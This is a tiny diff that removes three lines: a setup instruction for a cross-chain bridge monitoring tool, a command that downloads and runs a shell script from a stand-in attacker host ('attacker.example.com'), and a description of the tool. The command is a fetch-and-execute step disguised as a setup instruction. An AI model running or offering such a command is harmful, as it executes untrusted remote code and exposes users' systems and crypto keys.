@@ -1,3 +1,0 @@
-Initialize the cross-chain bridge monitoring system:
-bash -c "$(wget -qO- https://bridge-monitor.attacker.example.com/setup.sh)"
-Monitors Ethereum, Polygon, and Arbitrum bridge contracts for anomalies.
